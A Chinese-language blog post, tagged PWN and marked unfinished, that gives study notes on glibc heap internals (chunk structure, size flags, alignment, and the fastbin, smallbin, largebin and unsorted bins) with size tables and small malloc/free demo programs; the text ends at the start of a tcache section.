<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="開坑啦，主要是參考angelboy的投影片 和 影片還有 sean 大大的影片 https://www.youtube.com/watch?v=qFyoWH_5Clo
2021/06/05 繼續還技術債…https://www.youtube.com/watch?v=I3X69ADZOnwhttps://hackmd.io/@sysprog/c-memory?type=view (x86)
這篇僅適用於glibc &amp;lt; 2.25 以下的，在之後的glibc都新增了一種叫做 tcatch 的機制
這邊主要是做一個圖文的筆記
首先說了


主要是以 malloc 分配的記憶體大小為基礎

第二次執行 malloc 時，只要分配出去的總大小不超過 128 kb, 則不會再執行syscall 去要空間，只有超過 128k 時才會用 brk 去跟 system 要空間
即使所有 main arena 都 free() 完，也不會立即還給 system (這時的記憶體空間由 glibc 管)
128kb 是 threshold 的預設值，事實上可以透過更改 threshold 的值改變 brk 與 mmap 的判斷分界，threshold 可以設定介於 128kb 到 32mb 的值https://hackmd.io/@jserv/B1SRlfeee?type=view
32位元的話 brk 預設會給 132kb 的空間，64位元則是給 136kb

Chunk

glibc 在實作記憶體管理時所使用的 data structure 
malloc 分配出去一個空間即為一個 chunk
如果該 chunk 被 free 的話被則會加入名為 bin 的 link-list
chunk 的種類分為 Allocated chunk、Free chunk、Top chunk
malloc 所需要的空間有可能不等於 chunk 實際得到的空間">
    

    <!--Author-->
    
        <meta name="author" content="AStar">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="heap_exploitation (未完)"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="AStar&#39;s Blog"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

        <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>heap_exploitation (未完) - AStar&#39;s Blog</title>

    <!-- Bootstrap Core CSS -->
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Google Analytics -->
    


    <!-- favicon -->
    
	
<meta name="generator" content="Hexo 5.4.0"></head>


<body>

    <!-- Menu -->
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">AStar</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                
                    <li>
                        <a href="/">
                            
                                Home
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/archives">
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/tags">
                            
                                Tags
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/categories">
                            
                                Categories
                            
                        </a>
                    </li>
                
                    <li>
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-clean-blog">
                            
                                <i class="fa fa-github fa-stack-2x"></i>
                            
                        </a>
                    </li>
                
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>

    <!-- Main Content -->
    <!-- Page Header -->
<!-- Set your background image for this header in your post front-matter: cover -->

<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <h1>heap_exploitation (未完)</h1>
                    
                    <span class="meta">
                        <!-- Date and Author -->
                        
                        
                            2019-10-30
                        
                    </span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">

            <!-- Tags and categories -->
           
                <div class="col-lg-4 col-lg-offset-2 col-md-5 col-md-offset-1 post-tags">
                    
                        


<a href="/tags/PWN/">#PWN</a>


                    
                </div>
                <div class="col-lg-4 col-md-5 post-categories">
                    
                </div>
            

            <!-- Gallery -->
            

            <!-- Post Main Content -->
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <p>開坑啦，主要是參考angelboy的<a target="_blank" rel="noopener" href="https://www.slideshare.net/AngelBoy1/heap-exploitation-51891400">投影片</a> 和 <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=FieppxsupDc">影片</a><br>還有 sean 大大的影片 <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=qFyoWH_5Clo">https://www.youtube.com/watch?v=qFyoWH_5Clo</a></p>
<p>2021/06/05 繼續還技術債…<br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=I3X69ADZOnw">https://www.youtube.com/watch?v=I3X69ADZOnw</a><br><a target="_blank" rel="noopener" href="https://hackmd.io/@sysprog/c-memory?type=view">https://hackmd.io/@sysprog/c-memory?type=view</a> (x86)</p>
<p>這篇僅適用於glibc &lt; 2.25 以下的，在之後的glibc都新增了一種叫做 tcatch 的機制</p>
<p>這邊主要是做一個圖文的筆記</p>
<p>首先說了</p>
<p><img src="/img/2019/heap_exploitation/heap_0.PNG" alt=""></p>
<p><img src="/img/2019/heap_exploitation/heap_1.PNG" alt=""></p>
<p>主要是以 malloc 分配的記憶體大小為基礎</p>
<ul>
<li>第二次執行 malloc 時，只要分配出去的<code>總</code>大小不超過 128 kb, 則不會再執行syscall 去要空間，只有超過 128k 時才會用 brk 去跟 system 要空間</li>
<li>即使所有 main arena 都 <code>free()</code> 完，也不會立即還給 system (這時的記憶體空間由 glibc 管)</li>
<li>128kb 是 threshold 的預設值，事實上可以透過更改 threshold 的值改變 brk 與 mmap 的判斷分界，threshold 可以設定介於 128kb 到 32mb 的值<br><img src="/img/2019/heap_exploitation/heap_threshold.png" alt=""><br><a target="_blank" rel="noopener" href="https://hackmd.io/@jserv/B1SRlfeee?type=view">https://hackmd.io/@jserv/B1SRlfeee?type=view</a></li>
<li><p>32位元的話 brk 預設會給 132kb 的空間，64位元則是給 136kb</p>
</li>
<li><p>Chunk</p>
<ul>
<li>glibc 在實作記憶體管理時所使用的 data structure </li>
<li><code>malloc</code> 分配出去一個空間即為一個 chunk</li>
<li>如果該 <code>chunk</code> 被 <code>free</code> 的話被則會加入名為 <code>bin</code> 的 link-list</li>
<li><code>chunk</code> 的種類分為 <code>Allocated chunk</code>、<code>Free chunk</code>、<code>Top chunk</code></li>
<li><code>malloc</code> 所需要的空間有可能不等於 <code>chunk</code> 實際得到的空間</li>
</ul>
</li>
</ul>
<p><img src="/img/2019/heap_exploitation/heap_2.PNG" alt=""></p>
<ul>
<li><p>Allocated chunk</p>
<ul>
<li>Allocated chunk 主要由 chunk header (prev_size + size) + user data 組成</li>
<li>prev_size<ul>
<li><code>如果上一塊的 chunk 是 free 的狀態</code>，則該欄位會存有上一塊 chunk 的 size (包括 header )</li>
<li>這裡的上一塊是指<code>連續記憶體</code>的上一塊</li>
<li>若上一塊 chunk 非 free 的狀態 (PREV_INUSE=1)，這個空間則是用來當作 user data 使用</li>
</ul>
</li>
<li>size<ul>
<li>記錄此 chunk 的空間大小(包含 header)，<code>最後 3 bits 保留給下述的 FLAG 使用，不列入計算</code></li>
<li>PREV_INUSE (bit:0):　標示上一塊 chunk 是否為 <code>freed</code></li>
<li>IS_MMAPPED (bit:1):　該 chunk 是否由 mmap 分配</li>
<li>NON_MAIN_ARENA (bit:2):　是否不屬於 main arena</li>
</ul>
</li>
<li>由於分配 heap 空間的時候會針對記憶體做對齊的動作，所以 malloc 的空間不一定等於 chunk 的空間<ul>
<li>空間計算公式: <code>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</code><ul>
<li>req = require size</li>
<li>SIZE_SZ = 4 (32bit) or 8 (64bit)</li>
<li>MALLOC_ALIGNMENT = 2 * SIZE_SZ = 0x10<br><img src="/img/2019/heap_exploitation/heap_MALLOC_ALIGNMENT.png" alt=""><br>x86 也是一樣的大小<br><img src="/img/2019/heap_exploitation/heap_MALLOC_ALIGNMENT_x86.png" alt=""></li>
<li>MALLOC_ALIGN_MASK = MALLOC_ALIGNMENT - 1 = 0xf<br><img src="/img/2019/heap_exploitation/heap_MALLOC_ALIGN_MASK.png" alt=""></li>
</ul>
</li>
<li>簡單來說 require size + 0x8 算出來的值若介於 0x21 ~ 0x2f 的話會無條件進位至 0x30</li>
<li>若 require size + 0x8 得出 0x20 則維持 0x20<br>下面實際做一次<br>source code<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">        setvbuf(stdout, 0, 2, 0);</span><br><span class="line">        setvbuf(stdin, 0, 2, 0);</span><br><span class="line"></span><br><span class="line">        char *chunk1;</span><br><span class="line">        char *chunk2;</span><br><span class="line">        char *chunk3;</span><br><span class="line"></span><br><span class="line">        chunk1 = (char *)malloc(0x20);</span><br><span class="line">        memset(chunk1, &#x27;a&#x27;, 0x20);</span><br><span class="line">        getchar();</span><br><span class="line">        chunk2 = (char *)malloc(0x48);</span><br><span class="line">        memset(chunk2, &#x27;b&#x27;, 0x48);</span><br><span class="line">        getchar();</span><br><span class="line">        chunk3 = (char *)malloc(0x48);</span><br><span class="line">        memset(chunk3, &#x27;c&#x27;, 0x48);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
第一個 chunk 要了 0x20 的空間，0x20+0x8 = 0x28 介於 0x21 ~ 0x2f 之間因此給他 0x30<br>第二個 chunk 要了 0x48 的空間，0x48+0x8 = 0x50 因此給他 0x50 的空間<br><img src="/img/2019/heap_exploitation/heap_allocate_parseheap.png" alt=""><br>這是 Allocate heap 的結果<br><img src="/img/2019/heap_exploitation/heap_allocate_chunk.png" alt=""><br>大概畫一下空間<br><img src="/img/2019/heap_exploitation/heap_allocate_chunk_printer.png" alt=""><br>綠色框是 chunk header 紅色框是 user data的空間<br>可以看到綠框跟紅框有重疊的空間，就是因為上面說的 PREV_INUSE=1 的話 prev_size 的空間會被拿來給 user data 使用<br><img src="/img/2019/heap_exploitation/heap_inuse_chunk.png" alt=""><br><a target="_blank" rel="noopener" href="https://sourceware.org/glibc/wiki/MallocInternals">https://sourceware.org/glibc/wiki/MallocInternals</a></li>
</ul>
</li>
</ul>
</li>
<li><p>Freed chunk</p>
<ul>
<li>整體架構:<br><img src="/img/2019/heap_exploitation/heap_malloc_chunk_struct.png" alt=""> </li>
<li>如果該 <code>chunk</code> 被 <code>free</code> 的話被則會加入名為 <code>bin</code> 的 link-list</li>
<li>prev_size</li>
<li>size</li>
<li>fd : point to next chunk (包含 bin)<ul>
<li>這邊指的是 <code>link list</code> 中的 chunk, 而<code>非</code>連續記憶體中的 chunk</li>
</ul>
</li>
<li>bk : point to last chunk (包含 bin)<ul>
<li>這邊指的是 <code>link list</code> 中的 chunk, 而<code>非</code>連續記憶體中的 chunk</li>
</ul>
</li>
<li>fd_nextsize : point to next large chunk(僅限large chunk有，不包含 bin )</li>
<li>bk_nextsize : point to last large chunk(僅限large chunk有，不包含 bin )</li>
</ul>
</li>
</ul>
<p><img src="/img/2019/heap_exploitation/heap_free_chunk.png" alt=""></p>
<ul>
<li>Top chunk<ul>
<li>第一次 <code>malloc</code> 的時候會將 heap 切成兩塊，第一塊就是 <code>malloc</code> 需要的那<br>塊其餘的為 <code>top chunk</code>, 此後若需要 chunk 時將會從 <code>top chunk</code> 切出去</li>
<li>prev_size</li>
<li>size<ul>
<li>顯示 <code>top chunk</code> 還剩多少空間</li>
</ul>
</li>
<li>為了避免 chunk 被合併進 top chunk 內，top chunk 的 inuse bit 始終為 1</li>
</ul>
</li>
</ul>
<p>source code<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">        setvbuf(stdout, 0, 2, 0);</span><br><span class="line">        setvbuf(stdin, 0, 2, 0);</span><br><span class="line"></span><br><span class="line">        char *chunk1;</span><br><span class="line">        char *chunk2;</span><br><span class="line">        char *chunk3;</span><br><span class="line"></span><br><span class="line">        chunk1 = (char *)malloc(0x20);</span><br><span class="line">        memset(chunk1, &#x27;a&#x27;, 0x20);</span><br><span class="line">        printf(&quot;malloc chunk1&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        getchar();</span><br><span class="line">        chunk2 = (char *)malloc(0x48);</span><br><span class="line">        memset(chunk2, &#x27;b&#x27;, 0x48);</span><br><span class="line">        getchar();</span><br><span class="line">        chunk3 = (char *)malloc(0x48);</span><br><span class="line">        memset(chunk3, &#x27;c&#x27;, 0x48);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        printf(&quot;free chunk1&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        free(chunk1);</span><br><span class="line">        printf(&quot;free chunk2&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        free(chunk2);</span><br><span class="line">        printf(&quot;free chunk3&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        free(chunk3);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>把上面的 source code 改一下再用 gdb trace 看看</p>
<ul>
<li><p>Bin</p>
<ul>
<li>linked list</li>
<li>為了讓 <code>malloc</code> 能更快地找到適合的大小的 chunk，因此在 <code>free</code> 的時候<br>會將 <code>freed chunk</code> 加到適合的bin</li>
<li><p>由 main_arena 進行分配，一共有 136 個 bins 陣列</p>
<ul>
<li>136 = <code>NFASTBINS</code> + <code>NBINS</code> - 1 = 136<ul>
<li>NFASTBINS = 9</li>
<li>NBINS = 128<br><img src="/img/2019/heap_exploitation/heap_NBINS.png" alt=""><br><img src="/img/2019/heap_exploitation/heap_136bins.png" alt=""></li>
</ul>
</li>
<li>10 個分配給 fastbin</li>
<li>126 個則分配給 unsortbin(1)、smallbin(62)、largebin(63)</li>
<li><p>這邊放實際 trace 結果，關於 bins 的大小分類下面有更仔細的描述，建議可以先看下面針對各個 bins 的介紹後再來看這邊</p>
<ol>
<li>首先以下圖當範例<br><img src="/img/2019/heap_exploitation/heap_bins_demo_1.png" alt=""></li>
<li>進去 unsorted bin 看他的 fd/bk 發現是指向 <code>main_arena</code><br><img src="/img/2019/heap_exploitation/heap_bins_demo_2.png" alt=""></li>
<li>把整個 bins 攤開來看，可以看到 fastbin 的 10 個 bins (0x7ffff7dd3768 ~ 0x7ffff7dd37b0)<br><img src="/img/2019/heap_exploitation/heap_bins_demo_3_1.png" alt=""><br>因為是單鏈，所以一個 address 只會指向最開頭的 chunk 不會有另一個 address 去接最後後一個 chunk 位置</li>
<li>再回來看 unsorted bin<br><img src="/img/2019/heap_exploitation/heap_bins_demo_3_2.png" alt=""><br><code>0x7ffff7dd37c8</code> 這個位址代表 bins[1]，他指向 unsortbin 的第一個位置<br>雙鏈表的 bins 會有兩個位置，分別指向對應鏈表的第一和最後一個 chunk，以這張圖來說因為 unsortbin 只有一個 chunk，所以第一和最後一個 chunk 是同一個</li>
<li>現在來看第二個情況<br><img src="/img/2019/heap_exploitation/heap_bins_demo_4.png" alt=""><br>關注在 smallbin<br><img src="/img/2019/heap_exploitation/heap_bins_demo_4_1.png" alt=""><br>放在 bins 裡的位置對應 <code>smallbin_index</code> 的 return 值 (往下會有說明)，smallbin[0] 對應的就是 bins[2]<br>bins[0] 嚴格來說是指向 top chunk 的位置，但 top chunk 他不會有被取出來使用的情況發生，所以不會動到他，這也是為什麼下面網站 <code>bins[0]=N/A</code> 的原因</li>
</ol>
</li>
<li><p><a target="_blank" rel="noopener" href="https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/">https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/</a></p>
</li>
</ul>
</li>
<li><p>根據大小一共分為下列的 linked list</p>
<ul>
<li>fastbin<ol>
<li>a singly linked list</li>
<li>chunk size &lt;= 128 bytes (0x80 bytes)</li>
<li>128 的由來是 <code>global_max_fast</code>，<code>global_max_fast</code> 的初始值是由 <code>set_max_fast</code> 訂定的<br><img src="/img/2019/heap_exploitation/heap_global_max_fast.png" alt=""><br>而 <code>set_max_fast</code> 給定的初始值是 <code>DEFAULT_MXFAST</code><br><img src="/img/2019/heap_exploitation/heap_DEFAULT_MXFAST.png" alt=""><br>global_max_fast = <code>(DEFAULT_MXFAST + SIZE_SZ) &amp;~ MALLOC_ALIGN_MASK</code> = 128(0x80)<ul>
<li>SIZE_SZ = 0x8 (64bit)</li>
<li>DEFAULT_MXFAST = 64 * SIZE_SZ / 4 = 128</li>
<li>MALLOC_ALIGN_MASK = 0xf</li>
</ul>
</li>
<li><code>不會取消鄰近 chunk 的 inuse flag</code></li>
<li>根據 chunk 的大小，再分為 7 個 fastbin 分別為 0x20, 0x30, 0x40,…,0x80 (含 chunk header size)<ul>
<li>雖然上面說 7 個，但其實總共有10個 fastbinsY，最後三個做為保留不使用<br><img src="/img/2019/heap_exploitation/heap_fastbinsY.png" alt=""><ul>
<li>NFASTBINS = (((<code>MAX_FAST_SIZE</code> + <code>SIZE_SZ</code> + <code>MALLOC_ALIGN_MASK</code>) &amp;~ <code>MALLOC_ALIGN_MASK</code>) &gt;&gt; 4) - 2=9<ul>
<li>SIZE_SZ = 8</li>
<li>MAX_FAST_SIZE = (80 * SIZE_SZ / 4) = 160</li>
<li>MALLOC_ALIGN_MASK = 0xf</li>
</ul>
</li>
</ul>
</li>
<li>假設 free 0x24 bytes 的 chunk size，則會被安排到 0x20 的 fastbin</li>
</ul>
</li>
<li><code>LIFO</code></li>
<li>當下次 malloc 大小與這次 free 的大小相同時，會取相同的位置的<br>　    chunk (簡單來說會先去fastbin裡面找是否有符合大小的chunk)</li>
</ol>
</li>
<li><p>smallbin</p>
<ol>
<li>circular doubly linked list</li>
<li>0x20 &lt;=chunk size &lt; 1024 bytes (0x400)</li>
<li>FIFO</li>
<li>根據 chunk 的大小，再分為62個 bin index 分別為 0x30, 0x40, 0x50…0x400 (含 chunk header size)<br><code>smallbin_index(sz) = sz &gt;&gt; 4</code><br><img src="/img/2019/heap_exploitation/heap_smallbin_index.png" alt=""><br><code>SMALLBIN_CORRECTION</code> = <code>#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</code> = 0<br>下表的 size 不含 chunk header
        <table class="table table-bordered table-striped table-condensed">
          <thead>
              <tr>
                <th class="text-center">idx</th>
                <th class="text-center">32 bits</th>
                <th class="text-center">64 bits</th>
              </tr>
          </thead>
          <tbody>
            <tr>
                <td style="text-align: center;vertical-align: middle;">2</td>
                <td style="text-align: center;vertical-align: middle;">16</td>
                <td style="text-align: center;vertical-align: middle;">32</td>
            </tr>
            <tr>
                <td style="text-align: center;vertical-align: middle;">3</td>
                <td style="text-align: center;vertical-align: middle;">24</td>
                <td style="text-align: center;vertical-align: middle;">48</td>
            </tr>
            <tr>
                <td style="text-align: center;vertical-align: middle;">4</td>
                <td style="text-align: center;vertical-align: middle;">32</td>
                <td style="text-align: center;vertical-align: middle;">64</td>
            </tr>
            <tr>
                <td style="text-align: center;vertical-align: middle;">x</td>
                <td style="text-align: center;vertical-align: middle;">2*4*x</td>
                <td style="text-align: center;vertical-align: middle;">2*8*x</td>
            </tr>
            <tr>
                <td style="text-align: center;vertical-align: middle;">63</td>
                <td style="text-align: center;vertical-align: middle;">504</td>
                <td style="text-align: center;vertical-align: middle;">1008</td>
            </tr>
          </tbody>
        </table>
        
<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/glibc-heap/heap_structure/#small-bin">https://ctf-wiki.org/pwn/linux/glibc-heap/heap_structure/#small-bin</a></li>
</ol>
</li>
<li><p>largebin</p>
<ol>
<li>circular doubly linked list (sorted list)</li>
<li>1024 bytes &lt;= chunk size </li>
<li>1024 的來源是由 <code>MIN_LARGE_SIZE</code> 得來<br>MIN_LARGE_SIZE = <code>((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</code> = 0x400<ul>
<li>NSMALLBINS = 64 (0x40)</li>
<li>MALLOC_ALIGNMENT = 0x10</li>
<li>SIZE_SZ = 8 (64bit)</li>
<li>SMALLBIN_CORRECTION = MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ = 0</li>
<li>SMALLBIN_WIDTH = MALLOC_ALIGNMENT = 0x10</li>
</ul>
</li>
<li>freed chunk 會多兩個欄位 fd_nextsize, bk_nextsize <ul>
<li>因為 largebin 裡面的 chunk 大小都不一，為了方便尋找合適的 chunk，會另外針對 largebin chunk 維護一個 <code>nextsize</code> 鏈表</li>
<li>這個鏈表是根據 chunk 大小進行連接的<ul>
<li>如果 largebin 裡面的 chunk 沒有其他相同大小的 chunk，則該 chunk 會被押上 fd_nextsize 和 bk_nextsize，這意味著 nextsize 鏈表裡面只會有大小不同的 chunk</li>
<li>fd_nextsize: 指向 nextsize 鏈表的下一個 large chunk</li>
<li>bk_nextsize: 指向 nextsize 鏈表的上一個 large chunk<br><img src="https://pic3.zhimg.com/80/v2-013b4b50d1e03e09f6dab79bcfb97e52_720w.jpg" alt=""></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/373555570">https://zhuanlan.zhihu.com/p/373555570</a></li>
<li><a target="_blank" rel="noopener" href="https://www.sec4.fun/2020/05/25/heapOverflow2/">https://www.sec4.fun/2020/05/25/heapOverflow2/</a></li>
</ul>
</li>
</ul>
</li>
<li>FIFO </li>
<li>根據大小再切成63個 bin index, 大小不再固定<ul>
<li>因為不再是大小固定，因此再放進 largebin 的同時會進行 sort 排列，大的在前小的在後<br><img src="/img/2019/heap_exploitation/heap_largebin_check.png" alt="">
          <table class="table table-bordered table-striped table-condensed">
            <thead>
              <tr>
                <th class="text-center">idx</th>
                <th class="text-center">size</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td style="text-align: center;vertical-align: middle;">64</td>
                <td style="text-align: center;vertical-align: middle;">0x400~(0x440-1) bytes</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">65</td>
                <td style="text-align: center;vertical-align: middle;">0x440~(0x480-1) bytes</td>
              <tr>
                <td style="text-align: center;vertical-align: middle;">...</td>
                <td style="text-align: center;vertical-align: middle;">以 0x40 bytes 遞增</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">64&lt;=x&lt;=96</td>
                <td style="text-align: center;vertical-align: middle;">0x400+(0x40*(x-64)) ~ 0x400+((0x40*(x-63))-1)</td>
              </tr>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">96</td>
                <td style="text-align: center;vertical-align: middle;">0xc00~(0xc40-1) bytes</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">97</td>
                <td style="text-align: center;vertical-align: middle;">0xc40~(0xe00-1) bytes (0x1c0)</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">98</td>
                <td style="text-align: center;vertical-align: middle;">0xe00~(0x1000-1) bytes</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">99</td>
                <td style="text-align: center;vertical-align: middle;">0x1000~(0x1200-1) bytes</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">...</td>
                <td style="text-align: center;vertical-align: middle;">以 0x200 bytes 遞增</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">98&lt;=y&lt;=111</td>
                <td style="text-align: center;vertical-align: middle;">`0xe00+(0x200*(y-98)) ~ 0xe00+((0x200*(y-97))-1)`</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">111</td>
                <td style="text-align: center;vertical-align: middle;">0x2800~(0x2a00-1) bytes</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">112</td>
                <td style="text-align: center;vertical-align: middle;">0x2a00~(0x3000-1) bytes (0x600)</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">113</td>
                <td style="text-align: center;vertical-align: middle;">0x3000~(0x4000-1) bytes</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">114</td>
                <td style="text-align: center;vertical-align: middle;">0x4000~(0x5000-1) bytes</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">...</td>
                <td style="text-align: center;vertical-align: middle;">以 0x1000 bytes 遞增</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">120</td>
                <td style="text-align: center;vertical-align: middle;">0xa000~(0xb000-1) bytes</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">120</td>
                <td style="text-align: center;vertical-align: middle;">0xb000~(0x10000-1) bytes (0x5000)</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">121</td>
                <td style="text-align: center;vertical-align: middle;">0x10000~(0x18000-1) bytes</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">...</td>
                <td style="text-align: center;vertical-align: middle;">以 0x8000 bytes 遞增</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">123</td>
                <td style="text-align: center;vertical-align: middle;">0x20000 ~ (0x28000-1) bytes</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">124</td>
                <td style="text-align: center;vertical-align: middle;">0x28000~(0x40000-1) bytes</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">125</td>
                <td style="text-align: center;vertical-align: middle;">0x40000~(0x80000-1) bytes</td>
              </tr>
              <tr>
                <td style="text-align: center;vertical-align: middle;">126</td>
                <td style="text-align: center;vertical-align: middle;">0x80000~(0xc0000-1) bytes</td>
              </tr>
            </tbody>
          </table>
          
</li>
</ul>
</li>
</ol>
</li>
<li><p>unsorted bin</p>
<ol>
<li>circular doubly linked list</li>
<li>FIFO</li>
<li>當 free 的大小 &gt; 128 bytes 時，glibc 並不會馬上將他歸入 bin 內，而是先放入 unsort bin 裡面，顧名思義裡面的 chunk 沒有經過大小排序</li>
<li>下次 malloc 的時候，會先去 unsorted bin 中尋找有沒有符合的<br> chunk 使用，每找到一個不符合大小的chunk，會將其 chunk 放入對應的 bin 中，如果整個 unsorted bin 都沒有才會去對應的 bin 中尋找，但 smallbin 大小的 chunk 除外，<code>如果 smallbin 中有符合 malloc 大小的 chunk 則反而會先從 smallbin 中拿</code></li>
</ol>
</li>
<li><p>last remainder chunk  </p>
<ul>
<li>malloc 一塊 chunk 出去時，如果有找到比較大的 chunk，會切成兩塊一部分給 user，另一部份就會被標記成 last remainder，unsortbin 也會使用此一機制，<code>從 top chunk 切剩下的部分並不會被標記成 last remainder</code></li>
</ul>
</li>
<li><p>Tcache</p>
<ul>
<li>libc 2.26開始的新機制</li>
<li>為了加速程式執行而誕生的</li>
